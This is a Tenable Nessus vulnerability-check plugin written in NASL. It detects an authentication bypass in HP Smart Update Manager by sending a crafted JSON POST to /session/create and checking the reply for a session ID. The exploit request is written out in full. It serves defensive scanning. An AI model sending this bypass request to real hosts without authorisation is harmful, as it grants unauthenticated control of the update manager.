#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(133955);
  script_version("1.1");
  script_set_attribute(attribute:"plugin_modification_date", value:"2020/02/24");

  script_xref(name:"TRA", value:"TRA-2020-02");

  script_name(english:"HP Smart Update Manager Remote Unauthorized Access.");

  script_set_attribute(attribute:"synopsis", value:
"A software/firmware update application running on the remote is
affected by an authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The HPE Smart Update manager running on the remote host is affected
by an authentication bypass vulnerability. An unauthenticated, remote
attacker can exploit this, via a specially crafted request, to bypass
authentication and execute arbitrary actions defined by the
application.");
  script_set_attribute(attribute:"solution", value:
"HP Smart Update Manager 8.5.0 or later appears to fix the vulnerability. Contact the vendor for confirmation.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"This vulnerability is very similar to CVE-2019-11988. The score is based on CVE-2019-11988.");

  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"vuln_publication_date", value:"2020/01/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2020/02/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:smart_update_manager");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2020 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("hp_sum_detect.nbin");
  script_require_keys("installed_sw/HP Smart Update Manager");
  script_require_ports("Services/www", 63001, 63002);

  exit(0);
}

include('audit.inc');
include('global_settings.inc');
include('misc_func.inc');
include('install_func.inc');
include('http.inc');

appname = 'HP Smart Update Manager';

# Exit if app is not detected
get_install_count(app_name:appname, exit_if_zero:TRUE);

# Service may be marked as broken, so don't use get_http_port
port = get_kb_item_or_exit('Services/www');

# Exit if app is not detected on this port
get_single_install(app_name:appname, port:port);

# Attack vector via https only
if (get_port_transport(port) == ENCAPS_IP)
  exit(0, 'Skipped testing non-https port ' + port + '.');

# Perform the auth bypass
url = '/session/create';
data = '{"hapi":{"username":"any_user","password":"any_password","language":"en","mode":"gui", "usesshkey":true, "privatekey":"any_privatekey", "passphrase":"any_passphase","settings":{"output_filter":"passed","port_number":"444"}}}'; 
 
res = http_send_recv3(
  method : 'POST',
  port   : port,
  item   : url,
  data   : data,
  content_type  : 'application/json',
  exit_on_fail : TRUE
);

# Vulnerable response (auth bypass successful):
#   - hcode 0
#   - A sessionId returned in the response
#
# {"hapi":{"sessionId":"t4014556327","isSameSessionExists":true,"hcode":0,"hmessage":"Session already exists."}}
if('200' >< res[0] &&
  res[2] =~ '"hapi".*"hcode"\\s*:\\s*0' &&
  res[2] =~ '"hapi".*"sessionId"\\s*:\\s*"\\s*t')
{
  out = preg_replace(string:res[2], pattern:'"sessionId"\\s*:\\s*"\\D\\w+"',replace: '"sessionId":"<REDACTED>"');
  security_report_v4(
    port       : port,
    generic    : TRUE,
    severity   : SECURITY_HOLE,
    request    : make_list(http_last_sent_request()),
    output     : out
  );
}
else 
  audit(AUDIT_LISTEN_NOT_VULN, 'HPE Smart Update Manager', port);
